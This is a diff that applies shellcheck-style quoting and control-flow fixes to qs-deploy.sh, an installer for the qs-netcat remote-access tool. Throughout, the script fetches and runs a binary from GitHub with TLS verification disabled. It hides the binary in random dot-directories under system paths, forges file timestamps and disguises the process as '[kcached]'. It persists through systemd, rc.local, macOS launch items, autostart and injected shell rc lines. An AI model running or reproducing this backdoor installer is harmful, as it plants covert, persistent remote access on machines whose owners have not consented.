Code refactored with shellcheck.

+++ qs-deploy.sh
@@ -57,15 +57,15 @@ print_status() {
 }
 
 print_progress() {
-	[[ ! -z "${VERBOSE}" ]] && return
-    echo -n ${YELLOW}"[*] ${RESET}"
-	echo -n $1
+	[[ -n "${VERBOSE}" ]] && return
+    echo -n "${YELLOW}[*] ${RESET}"
+	echo -n "$1"
 	n=${#1}
-	printf %$((70-$n))s |tr " " "."
+	printf %$((70-n))s |tr " " "."
 }
 
 print_warning() {
-  echo ${YELLOW}"[!] ${RESET}${1}"
+  echo "${YELLOW}[!] ${RESET}${1}"
 }
 
 print_error() {
@@ -73,7 +73,7 @@ print_error() {
 }
 
 print_fatal() {
-  echo -e ${RED}"[!] $1\n${RESET}"
+  echo -e "${RED}[!] $1\n${RESET}"
   kill -10 $$
 }
 
@@ -82,7 +82,7 @@ print_good() {
 }
 
 print_verbose() {
-  if [[ ! -z "${VERBOSE}" ]]; then
+  if [[ -n "${VERBOSE}" ]]; then
     echo "${WHITE}[*] ${RESET}${1}"
   fi
 }
@@ -97,12 +97,12 @@ print_fail(){
 
 must_exist() {
   for i in "$@"; do
-		command -v $i >$ERR_LOG || print_fatal "$i not installed! Exiting..."
+		command -v "$i" >"$ERR_LOG" || print_fatal "$i not installed! Exiting..."
   done
 }
 
 one_must_exist() {
-	command -v $1 >$ERR_LOG || command -v $2 >$ERR_LOG || print_fatal "Neither $1 nor $2 installed! Exiting..."
+	command -v "$1" >"$ERR_LOG" || command -v "$2" >"$ERR_LOG" || print_fatal "Neither $1 nor $2 installed! Exiting..."
 }
 
 ## Handle SININT
@@ -122,14 +122,14 @@ trap exit_on_signal_SIGTERM SIGTERM
 
 # Remove all artifacts and exit...
 clean_exit() {
-	[[ -f "$QS_PATH" ]] && rm -rf "`dirname $QS_PATH`" &>$ERR_LOG
+	[[ -f "$QS_PATH" ]] && rm -rf "$(dirname "$QS_PATH")" &>"$ERR_LOG"
 	kill -10 $$
 }
 
 # Create a directory if it does not exist and fix timestamp
 # xmkdir [directory] <ts reference file>
 xmkdir() {
-	mkdir -p "$1" &>$ERR_LOG || return 1
+	mkdir -p "$1" &>"$ERR_LOG" || return 1
 	touch -r "$2" "$1" || return 1
 	true
 }
@@ -201,8 +201,8 @@ get_latest_release_url() {
 	local API_URL="$BASE_URL/$BIN_NAME/releases/latest"
 	WGET_BIN=$(command -v wget)
 	CURL_BIN=$(command -v curl)
-	[[ ! -z $CURL_BIN ]] && curl -s "$API_URL" -o- | grep -E "/releases/download/.+${OS_NAME}_${OS_ARCH}\.tar\.gz"|cut -d'"' -f4 && return
-	[[ ! -z $WGET_BIN ]] && wget -q -O- "$API_URL"|grep -E "/releases/download/.+${OS_NAME}_${OS_ARCH}\.tar\.gz"|cut -d'"' -f4 && return
+	[[ -n $CURL_BIN ]] && curl -s "$API_URL" -o- | grep -E "/releases/download/.+${OS_NAME}_${OS_ARCH}\.tar\.gz"|cut -d'"' -f4 && return
+	[[ -n $WGET_BIN ]] && wget -q -O- "$API_URL"|grep -E "/releases/download/.+${OS_NAME}_${OS_ARCH}\.tar\.gz"|cut -d'"' -f4 && return
 }
 
 # Download the latest release of the qsocket util to the given directory.
@@ -214,8 +214,8 @@ download_util() {
 	print_verbose "Downloading: $DOWNLOAD_URL -> $1"
 	WGET_BIN=$(command -v wget)
 	CURL_BIN=$(command -v curl)
-	[[ ! -z $CURL_BIN ]] && curl -s -k -L -H "$ACCEPT_HEADER" "$DOWNLOAD_URL" -o "$1" &>$ERR_LOG && return 0
-	[[ ! -z $WGET_BIN ]] && wget -q --no-check-certificate --header="$ACCEPT_HEADER" "$DOWNLOAD_URL" -o "$1" &>$ERR_LOG && return 0
+	[[ -n $CURL_BIN ]] && curl -s -k -L -H "$ACCEPT_HEADER" "$DOWNLOAD_URL" -o "$1" &>"$ERR_LOG" && return 0
+	[[ -n $WGET_BIN ]] && wget -q --no-check-certificate --header="$ACCEPT_HEADER" "$DOWNLOAD_URL" -o "$1" &>"$ERR_LOG" && return 0
 	print_verbose "All download methods failed!"
 	return 1
 }
@@ -226,13 +226,13 @@ download_util() {
 # $1 = archive file 
 # $2 = extracted name 
 unpack_util() {
-	local TDIR="`dirname $1`"
-	tar -C "$TDIR" -xzf "$1" &>$ERR_LOG || return 1
-	rm -f $1 &>$ERR_LOG
-	mv "$TDIR/$BIN_NAME" "$2" &>$ERR_LOG || return 1
-	chmod +x "$2" &>$ERR_LOG || return 1
-	touch -r "/etc/passwd" "$2" &>$ERR_LOG
-	touch -r "/etc" "$TDIR" &>$ERR_LOG 
+	local TDIR="$(dirname "$1")"
+	tar -C "$TDIR" -xzf "$1" &>"$ERR_LOG" || return 1
+	rm -f "$1" &>"$ERR_LOG"
+	mv "$TDIR/$BIN_NAME" "$2" &>"$ERR_LOG" || return 1
+	chmod +x "$2" &>"$ERR_LOG" || return 1
+	touch -r "/etc/passwd" "$2" &>"$ERR_LOG"
+	touch -r "/etc" "$TDIR" &>"$ERR_LOG" 
 	QS_PATH="$2"
 	return 0
 }
@@ -241,7 +241,7 @@ unpack_util() {
 # try_dstdir "/tmp/.qs-foobar/xxx"
 # Return 0 on success.
 check_exec_dir(){
-	[[ ! -d "`dirname $i`" ]] && print_verbose "$i is not a directory!" && return 1
+	[[ ! -d "$(dirname "$1")" ]] && print_verbose "$i is not a directory!" && return 1
 	[[ ! -w "$1" ]] && print_verbose "$1 directory not writable!" && return 1;
 	[[ ! -x "$1" ]] && print_verbose "$1 directory not executable!" && return 1;
 	return 0;
@@ -253,35 +253,35 @@ inject_to_file()
 {
 	local fname="$1"
 	local inject="$2"
-	head -n 1 $fname | grep -q "#!" && head -n 1 $fname > "${fname}_"
-	echo "$2" >> "${fname}_"
-	cat $fname >> "${fname}_"
-	mv "${fname}_" "$fname" &>$ERR_LOG || return 1
-	touch -r "/etc/passwd" $fname
+	head -n 1 "$fname" | grep -q "#!" && head -n 1 "$fname" > "${fname}_"
+	echo "$inject" >> "${fname}_"
+	cat "$fname" >> "${fname}_"
+	mv "${fname}_" "$fname" &>"$ERR_LOG" || return 1
+	touch -r "/etc/passwd" "$fname"
 }
 
 
 create_qs_dir() {
-	local rand_dir=".`LC_ALL=C tr -dc A-Za-z0-9 </dev/urandom | head -c 8`"
+	local rand_dir=".$(LC_ALL=C tr -dc A-Za-z0-9 </dev/urandom | head -c 8)"
 	local root_dirs=("/lib" "/usr/lib" "/usr/bin" "/usr/lib32")
 	local user_dirs=("$HOME/.config" "/dev/shm" "/var/tmp" "/tmp")
 
 	## Root install methods
 	if [[ $UID -eq 0 ]]; then 
-		for i in ${root_dirs[@]}; do
+		for i in "${root_dirs[@]}"; do
 			[[ ! -d $i ]] && continue
 			xmkdir "$i/$rand_dir" "/etc" || continue
 			check_exec_dir "$i/$rand_dir" && echo -n "$i/$rand_dir" && return
-			rm -rfv "$i/$rand_dir" &>$ERR_LOG
+			rm -rfv "${i:?}/${rand_dir}" &>"$ERR_LOG"
 		done
 	fi
 
 	
-	for i in ${user_dirs[@]}; do
+	for i in "${user_dirs[@]}"; do
 		[[ ! -d $i ]] && continue
 		xmkdir "$i/$rand_dir" "/etc" || continue
 		check_exec_dir "$i/$rand_dir" && echo -n "$i/$rand_dir" && return
-		rm -rfv "$i/$rand_dir" &>$ERR_LOG
+		rm -rfv "${i:?}/${rand_dir}" &>"$ERR_LOG"
   	done
 
 	print_fatal "Failed to create a qsocket directory! Exiting..."
@@ -314,13 +314,13 @@ ExecStart=/bin/bash -c \"QS_ARGS='-liqs $S' exec -a ${PROC_HIDDEN_NAME} ${QS_PAT
 WantedBy=multi-user.target" > "${SERVICE_FILE}"
 
 	chmod 600 "${SERVICE_FILE}"
-	systemctl enable "${RAND_NAME}" &>$ERR_LOG || { print_verbose "Failed enabling service!"; rm -f "${SERVICE_FILE}"; return 1; } # did not work... 
+	systemctl enable "${RAND_NAME}" &>"$ERR_LOG" || { print_verbose "Failed enabling service!"; rm -f "${SERVICE_FILE}"; return 1; } # did not work... 
 	return 0
 }
 
 install_system_rclocal(){
 	[[ ! -f "${RCLOCAL_FILE}" ]] && print_verbose "$RCLOCAL_FILE not found! skipping to next method..." && return 1
-	if grep -q "QS_ARGS" "${RCLOCAL_FILE}" &>$ERR_LOG; then
+	if grep -q "QS_ARGS" "${RCLOCAL_FILE}" &>"$ERR_LOG"; then
 		print_error "Already installed in ${RCLOCAL_FILE}." && return 0
 	fi
 	RCLOCAL_LINE="set +m; HOME=\"$HOME\" TERM=xterm-256color SHELL=\"$SHELL\" QS_ARGS=\"-liqs $S\" $(command -v bash) -c \"cd $HOME; exec -a ${PROC_HIDDEN_NAME} ${QS_PATH}\" &>/dev/null &"
@@ -330,8 +330,8 @@ install_system_rclocal(){
 }
 
 exec_hidden() {
-	set +m; TERM="xterm-256color" QS_ARGS="-liqs $S" exec -a ${PROC_HIDDEN_NAME} ${QS_PATH} &
-	disown -a &> $ERR_LOG
+	set +m; TERM="xterm-256color" QS_ARGS="-liqs $S" exec -a "${PROC_HIDDEN_NAME}" ${QS_PATH} &
+	disown -a &> "$ERR_LOG"
 }
 
 
@@ -355,7 +355,7 @@ setup_macos_login_item() {
 </plist>"
   local item_plist_path="/Library/LaunchDaemons/org.$RAND_NAME.plist"
   [[ $1 == "user" ]] && item_plist_path="${HOME}/Library/LaunchAgents/org.$RAND_NAME.plist"
-  [[ -d "$(dirname $item_plist_path)" ]] || return 1
+  [[ -d "$(dirname "$item_plist_path")" ]] || return 1
   echo "$item_plist" > "$item_plist_path"
   [[ -f "$item_plist_path" ]] || return 1
   return 0
@@ -387,11 +387,16 @@ install_init_scripts() {
 
 	local success=""
 	INJECT_LINE="set +m; HOME=$HOME TERM=\"xterm-256color\" SHELL=\"$SHELL\" QS_ARGS=\"-liqs $S\" $(command -v bash) -c \"exec -a ${PROC_HIDDEN_NAME} ${QS_PATH}\" &>/dev/null &"
-	for target in ${inject_targets[@]}; do
-		grep -q QS_ARGS $target &>$ERR_LOG && print_status "!! WARNING !! QSocket access already installed via `basename $target`" && continue 
+	for target in "${inject_targets[@]}"; do
+		grep -q QS_ARGS "$target" &>"$ERR_LOG" && print_status "!! WARNING !! QSocket access already installed via $(basename "$target")" && continue 
 		[[ ! -f $target ]] && continue
-		print_progress "Installing access via `basename $target`"
-  	inject_to_file "$target" "$INJECT_LINE" && print_ok && success=1 || print_fail 
+		print_progress "Installing access via $(basename "$target")"
+    if inject_to_file "$target" "$INJECT_LINE"; then
+      print_ok 
+      success=1 
+    else
+      print_fail
+    fi
 	done
 
 	[[ -z $success ]] && return 1
@@ -399,29 +404,42 @@ install_init_scripts() {
 }
 
 install() {
-	[[ ! -z $QS_NOINST ]] && print_status "QS_NOINST is set. Skipping installation." && return 0
+	[[ -n $QS_NOINST ]] && print_status "QS_NOINST is set. Skipping installation." && return 0
 	print_progress "Installing systemwide remote access permanentally" && print_ok
   
 	## Root install methods
 	if [[ $UID -eq 0 ]];then
     if [[ $OS_NAME == "darwin" ]];then 
       print_progress "Installing access via login item"
-      setup_macos_login_item && print_ok && return 0 || print_fail
+      setup_macos_login_item && print_ok && return 0 
+      print_fail
     fi
     print_progress "Installing access via systemd"
-		install_system_systemd && print_ok && return 0 || print_fail
+		install_system_systemd && print_ok && return 0 
+    print_fail
 		print_progress "Installing access via rc.local"
-	 	install_system_rclocal && print_ok && return 0 || print_fail
+	 	install_system_rclocal && print_ok && return 0 
+    print_fail
 	fi
   
   local is_installed=false
   ## User install methods
   if [[ $OS_NAME == "darwin" ]];then 
     print_progress "Installing access via login item"
-    setup_macos_login_item "user" && is_installed=true && print_ok || print_fail
+    if setup_macos_login_item "user"; then 
+      is_installed=true 
+      print_ok 
+    else
+      print_fail
+    fi
   else
     print_progress "Installing access via autostart"
-    install_desktop_autostart && is_installed=true && print_ok || print_fail
+    if install_desktop_autostart;then 
+      print_ok
+      is_installed=true 
+    else
+      print_fail
+    fi
   fi
   ## Also inject into several init scripts just in case
 	install_init_scripts && is_installed=true
@@ -431,14 +449,13 @@ install() {
 
 init_problematic_vars() {
 	# Verbose error logs
-	[[ ! -z "$VERBOSE" ]] && ERR_LOG="`tty`"
+	[[ -n "$VERBOSE" ]] && ERR_LOG="$(tty)"
 
 	# Docker does not set USER
 	[[ -z "$USER" ]] && USER=$(id -un)
 	[[ -z "$UID" ]] && UID=$(id -u)
 	# User supplied vars...
 	[[ -n "$QS_URL_BASE" ]] && BASE_URL="$QS_URL_BASE"
-	[[ -n "$QS_OSARCH" ]] && OSARCH="$QS_OSARCH"
 	[[ -n "$QS_PLATFORM" ]] && OS_NAME="$QS_OS"
 	[[ -n "$QS_UTIL" ]] && BIN_NAME="$QS_UTIL"
 	# Set HOME if undefined 
@@ -454,11 +471,11 @@ init_problematic_vars() {
 print_usage() {
 
   echo -e "\n"
-  echo -n $S | $QS_PATH --qr
+  echo -n "$S" | $QS_PATH --qr
 	echo -e -n "\n"
-	echo -n ${BLUE} "# >>> Connect ============> ${RESET}" 
+	echo -n "${BLUE}# >>> Connect ============> ${RESET}" 
 	echo "qs-netcat -i -s $S"	
-	echo -n ${BLUE} "# >>> Connect With TOR ===> ${RESET}"
+	echo -n "${BLUE}# >>> Connect With TOR ===> ${RESET}"
 	echo "qs-netcat -T -i -s $S"	
 	# echo -n ${BLUE} "# >>> Uninstall ==========> "
 	# echo "QS_UNDO=1 bash -c \"\$(curl -fsSL qsocket.io/x)\""
@@ -482,7 +499,7 @@ BASE_URL="https://api.github.com/repos/qsocket"
 GITHUB_RELEASE_URL="https://github.com/qsocket/qs-netcat/releases/download"
 FALLBACK_RELEASE="v0.0.2-beta"
 QS_DIR=$(create_qs_dir)
-RAND_NAME="`LC_ALL=C tr -dc A-Za-z0-9 </dev/urandom | head -c 8`"
+RAND_NAME="$(LC_ALL=C tr -dc A-Za-z0-9 </dev/urandom | head -c 8)"
 BIN_NAME="qs-netcat"
 PROC_HIDDEN_NAME="[kcached]"
 SERVICE_FILE="/etc/systemd/system/$RAND_NAME.service"
@@ -490,7 +507,7 @@ RCLOCAL_FILE="/etc/rc.local"
 PROFILE_FILE="$HOME/.profile"
 
 # If no .profile exists, set the user rc file based on the shel[[ -f "$RCUSER_FILE" ]] || RCUSER_FILE="$HOME/.`echo -n $SHELL|tr "/" "\n"|tail -n 1`rc"
-[[ -f "$PROFILE_FILE" ]] || PROFILE_FILE="$HOME/.`echo -n $SHELL|tr "/" "\n"|tail -n 1`rc"
+[[ -f "$PROFILE_FILE" ]] || PROFILE_FILE="$HOME/.$(echo -n "$SHELL"|tr "/" "\n"|tail -n 1)rc"
 print_status "OS: $OS_NAME"
 print_status "Arch: $OS_ARCH"
 print_status "User: $USER"
@@ -500,14 +517,34 @@ print_status "Shell: $SHELL"
 print_status "Binary: $BIN_NAME"
 echo "" ## --- break after system info
 print_progress "Downloading latest $BIN_NAME binary for $OS_NAME ($OS_ARCH)"
-download_util "$QS_DIR/qs.tar.gz" && print_ok || (print_fail && print_fatal "$BIN_NAME download failed! Exiting...")
+if download_util "$QS_DIR/qs.tar.gz"; then 
+  print_ok 
+else
+  print_fail 
+  print_fatal "$BIN_NAME download failed! Exiting..."
+fi
 print_progress "Unpacking binaries"
-unpack_util "$QS_DIR/qs.tar.gz" "$QS_DIR/$RAND_NAME" && print_ok || (print_fail && print_fatal "Archive unpacking failed! Exiting...")
+if unpack_util "$QS_DIR/qs.tar.gz" "${QS_DIR}/${RAND_NAME}";then 
+  print_ok 
+else 
+  print_fail 
+  print_fatal "Archive unpacking failed! Exiting..."
+fi
 print_verbose "QSocket dir: $QS_PATH"
 print_progress "Testing qsocket binaries"
-[[ $($QS_PATH -h &>$ERR_LOG) -eq 0 ]] && print_ok || (print_fail && print_fatal "Binary test failed! Exiting...")
+if $QS_PATH -h &>"$ERR_LOG";then 
+  print_ok 
+else 
+  print_fail 
+  print_fatal "Binary test failed! Exiting..."
+fi
 [[ -z "$S" ]] && S=$($QS_PATH -g 2>&1) # Set secret if not given...
 install ||  print_error "Permanent install methods failed! Access will be lost after reboot."
 print_progress "Triggering initial execution"
-exec_hidden && print_ok || (print_fail && print_error "Initial execution failed! Try starting qsocket manually.")
+if exec_hidden; then 
+  print_ok 
+else 
+  print_fail 
+  print_error "Initial execution failed! Try starting qsocket manually."
+fi
 print_usage
